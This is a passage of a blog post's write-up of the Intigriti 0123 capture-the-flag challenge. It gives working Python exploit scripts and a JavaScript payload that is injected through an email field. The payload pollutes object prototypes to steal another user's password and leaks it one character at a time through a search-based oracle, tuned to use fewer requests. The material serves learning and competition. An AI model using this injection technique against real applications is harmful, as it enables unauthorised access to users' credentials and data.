    futures <span class="token operator">=</span> <span class="token punctuation">&#123;</span>executor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>create_oracle<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span> c <span class="token keyword">for</span> c <span class="token keyword">in</span> charset<span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> future <span class="token keyword">in</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>as_completed<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span class="token punctuation">:</span>
        current <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">if</span> current <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">or</span> current <span class="token operator">==</span> total<span class="token punctuation">:</span>
          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Progress: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>current<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>total<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leaking flag"</span><span class="token punctuation">)</span>

length <span class="token operator">=</span> <span class="token number">19</span>
ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">]</span> <span class="token operator">*</span> length
<span class="token keyword">with</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
    futures <span class="token operator">=</span> <span class="token punctuation">&#123;</span>executor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>leak_char<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> future <span class="token keyword">in</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>as_completed<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span class="token punctuation">:</span>
        index <span class="token operator">=</span> futures<span class="token punctuation">[</span>future<span class="token punctuation">]</span>
        data <span class="token operator">=</span> future<span class="token punctuation">.</span>result<span class="token punctuation">(</span><span class="token punctuation">)</span>
        ans<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> data
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">&#125;</span></span><span class="token string">s, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>req_count<span class="token punctuation">&#125;</span></span><span class="token string"> requests"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>This version takes 7s and 95 requests.</p>
<h2><span id="ultimate-version">Ultimate version</span></h2><p>For now, setup phase makes 10 requests and leaking phase makes 1 login + 2 update email + 2 search requests. </p>
<p>Can we still reduce the number of requests?</p>
<p>Sure, if we apply the “state-persistent” technique again.</p>
<p>Why do we need to make two requests for updating the email? Because we have two rounds, the leaking target is different bwteeen these two.</p>
<p>Here is the idea, how about make our JS code state-dependent? If a special email is not exists, we leak first round, otherwise second round.</p>
<p>The code is like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">==</span> <span class="token string">"PinkDraconian"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>flag <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>flag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>email <span class="token operator">==</span> <span class="token string">"SWITCH_EMAIL"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>condition <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>condition<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">==</span> <span class="token string">"account_oracle_"</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>flag<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token constant">INDEX</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">27</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">==</span> <span class="token string">"account_oracle_"</span> <span class="token operator">+</span>  <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>flag<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token constant">INDEX</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">27</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>At the beginning, <code>SWITCH_EMAIL</code> not exists, so <code>this.condition</code> is false. After we leak all the last digits, we update our email to <code>SWITCH_EMAIL</code> for the account we created earlier.</p>
<p>Now, the <code>SWITCH_EMAIL</code> exists, <code>this.__proto__.condition</code> becomes <code>true</code>, which makes our JS payload return first digit without updating the code again.</p>
<p>Also, we added some randomize for the account name and email to prevent  conflict.</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
<span class="token keyword">import</span> concurrent<span class="token punctuation">.</span>futures
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token keyword">import</span> random

BASE_URL <span class="token operator">=</span> <span class="token string">'https://challenge-0123.intigriti.io'</span>
LOGIN_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/login.html'</span>
EDIT_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/editor.html'</span>
QUERY_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/api/friends?q='</span>

FLAG_LENGTH <span class="token operator">=</span> <span class="token number">19</span>
charset <span class="token operator">=</span> <span class="token string">"0123456789abcdefghi"</span>
req_count <span class="token operator">=</span> <span class="token number">0</span>
stored_session <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">]</span> <span class="token operator">*</span> FLAG_LENGTH

<span class="token comment"># randomize the account to avoid conflict</span>
switch_email <span class="token operator">=</span> <span class="token string">"abc@abc.comm"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
account_oracle <span class="token operator">=</span> <span class="token string">"account_oracle_"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"_"</span>

<span class="token keyword">def</span> <span class="token function">create_oracle</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">global</span> req_count
  <span class="token keyword">global</span> stored_session
  c <span class="token operator">=</span> charset<span class="token punctuation">[</span>index<span class="token punctuation">]</span>
  session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>LOGIN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"username"</span><span class="token punctuation">:</span> account_oracle <span class="token operator">+</span> c<span class="token punctuation">,</span>
    <span class="token string">"password"</span><span class="token punctuation">:</span> account_oracle <span class="token operator">+</span> c<span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  req_count<span class="token operator">+=</span><span class="token number">1</span>

  stored_session<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"session"</span><span class="token punctuation">:</span> session<span class="token punctuation">,</span>
    <span class="token string">"name"</span><span class="token punctuation">:</span> account_oracle <span class="token operator">+</span> c
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_char</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token comment"># leak 10a + b + 27 = ascii</span>
  <span class="token comment"># use 'this.email == "SWITCH_EMAIL"' to change state so that we don't need to update the payload</span>
  <span class="token keyword">global</span> req_count
  <span class="token keyword">global</span> stored_session
  js_code <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
  if (this.username == "PinkDraconian")&#123;
    this.__proto__.flag = this.password;
  &#125; else if (this.flag) &#123;
    if (this.email == "SWITCH_EMAIL") &#123;
      this.__proto__.condition = 1;
    &#125;
    if (this.condition) &#123;
      return this.username == "account_oracle_" + Math.floor((this.flag.charCodeAt(INDEX) - 27) / 10)
    &#125;
    return this.username == "account_oracle_" +  (this.flag.charCodeAt(INDEX) - 27) % 10
  &#125;
  """</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'INDEX'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"SWITCH_EMAIL"</span><span class="token punctuation">,</span> switch_email<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"account_oracle_"</span><span class="token punctuation">,</span> account_oracle<span class="token punctuation">)</span>

  payload <span class="token operator">=</span> <span class="token string">'anything@anything.com" || (() => &#123;JS&#125;)() || "'</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'JS'</span><span class="token punctuation">,</span> js_code<span class="token punctuation">)</span>

  session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>

  data <span class="token operator">=</span> stored_session<span class="token punctuation">[</span>index<span class="token punctuation">]</span>
  session <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"session"</span><span class="token punctuation">]</span>
  name <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span>

  <span class="token comment"># we only need to update the payload for first round</span>
  <span class="token keyword">if</span> <span class="token builtin">round</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>EDIT_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
      <span class="token string">"email"</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"condition"</span><span class="token punctuation">,</span> <span class="token string">"condition"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    req_count <span class="token operator">+=</span> <span class="token number">1</span>

  <span class="token comment"># for second round we don't need to update email</span>
  resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>QUERY_URL <span class="token operator">+</span> name<span class="token punctuation">)</span>
  req_count <span class="token operator">+=</span> <span class="token number">1</span>

  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'#'</span>

  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>text <span class="token operator">==</span> <span class="token string">'null'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Failed'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'#'</span>

  data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
  num <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>account_oracle<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>

  <span class="token keyword">return</span> num

start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># create an account for our state</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
account_test_123 <span class="token operator">=</span> <span class="token string">"account_test_123"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>LOGIN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
  <span class="token string">"username"</span><span class="token punctuation">:</span> account_test_123<span class="token punctuation">,</span>
  <span class="token string">"password"</span><span class="token punctuation">:</span> account_test_123<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
req_count <span class="token operator">+=</span> <span class="token number">1</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"create oracle account..."</span><span class="token punctuation">)</span>
total <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span>
current <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">with</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span>FLAG_LENGTH<span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
    futures <span class="token operator">=</span> <span class="token punctuation">&#123;</span>executor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>create_oracle<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> future <span class="token keyword">in</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>as_completed<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span class="token punctuation">:</span>
        current <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">if</span> current <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">or</span> current <span class="token operator">==</span> total<span class="token punctuation">:</span>
          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Progress: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>current<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>total<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leaking flag first round"</span><span class="token punctuation">)</span>

length <span class="token operator">=</span> FLAG_LENGTH
ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">]</span> <span class="token operator">*</span> length

<span class="token keyword">with</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span>FLAG_LENGTH<span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
    futures <span class="token operator">=</span> <span class="token punctuation">&#123;</span>executor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>leak_char<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> future <span class="token keyword">in</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>as_completed<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span class="token punctuation">:</span>
        index <span class="token operator">=</span> futures<span class="token punctuation">[</span>future<span class="token punctuation">]</span>
        data <span class="token operator">=</span> future<span class="token punctuation">.</span>result<span class="token punctuation">(</span><span class="token punctuation">)</span>
        ans<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> data

<span class="token comment"># we update the email to let our payload return another result</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>switch_email<span class="token punctuation">)</span>
session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>EDIT_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
  <span class="token string">"email"</span><span class="token punctuation">:</span> switch_email
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
req_count <span class="token operator">+=</span> <span class="token number">1</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leaking flag second round"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>

<span class="token keyword">with</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span>FLAG_LENGTH<span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
    futures <span class="token operator">=</span> <span class="token punctuation">&#123;</span>executor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>leak_char<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> future <span class="token keyword">in</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>as_completed<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span class="token punctuation">:</span>
        index <span class="token operator">=</span> futures<span class="token punctuation">[</span>future<span class="token punctuation">]</span>
        data <span class="token operator">=</span> future<span class="token punctuation">.</span>result<span class="token punctuation">(</span><span class="token punctuation">)</span>
        ans<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span> <span class="token operator">+</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ans<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">27</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">&#125;</span></span><span class="token string">s, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>req_count<span class="token punctuation">&#125;</span></span><span class="token string"> requests"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>For this ultimate solution, it takes 5.3s and 19 + 2 + 3 * 19 &#x3D; 78 requests!</p>
<p>Compared to my previous solution which makes 185 requests, we reduced the number by half, what a big progress!</p>
<p>Again, credits to @antonio345 who offers the initial idea and also the POC, we discussed and improved the code together. It’s fun to see how far we can go.</p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2023/03/26/en/dicectf-2023-writeup/">DiceCTF 2023 Notes</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2023/01/10/en/security-of-encrypt-or-hash-password-in-client-side/">Is it meaningful to encrypt passwords when calling APIs on the website frontend?</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2023 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>English</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2023/01/23/intigriti-0123-second-order-injection/" class="dropdown-item">
                    繁體中文
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>